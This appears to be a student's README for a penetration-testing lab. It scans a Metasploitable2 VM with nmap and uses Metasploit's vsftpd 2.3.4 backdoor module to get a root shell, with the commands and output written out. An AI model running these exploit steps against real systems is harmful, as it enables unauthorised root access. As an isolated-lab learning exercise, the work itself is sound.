# 🔐 Cybersecurity Lab Setup and Exploitation (Task-1)

## 📌 Objective

To set up a penetration testing lab using Kali Linux and Metasploitable and perform vulnerability scanning and exploitation.

---

## 🛠 Tools Used

* Kali Linux
* Metasploitable2
* Nmap
* Metasploit Framework
* VirtualBox

---

## ⚙️ Lab Setup

* Installed Kali Linux and Metasploitable in VirtualBox
* Configured Host-Only Network
* Verified connectivity between attacker and target

---

## 🔍 Network Scanning

```bash
nmap 192.168.56.102
```

* Identified open ports:

  * FTP (21)
  * SSH (22)
  * HTTP (80)
  * Telnet (23)

---

## 💣 Exploitation

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.102
exploit
```

---

## 🔓 Gaining Access

```bash
sessions
sessions -i 1
shell
whoami
```

Output:

```
root
```

---

## 📸 Screenshots

1. Kali Linux Running
2. Metasploitable Login
3. Nmap Scan Result
4. Metasploit Exploit
5. Root Access

---

## 🎯 Conclusion

Successfully performed penetration testing by exploiting VSFTPD vulnerability and gained root access to the target system.

---

## 🚀 Outcome

* Learned Nmap scanning
* Understood Metasploit exploitation
* Gained practical ethical hacking experience
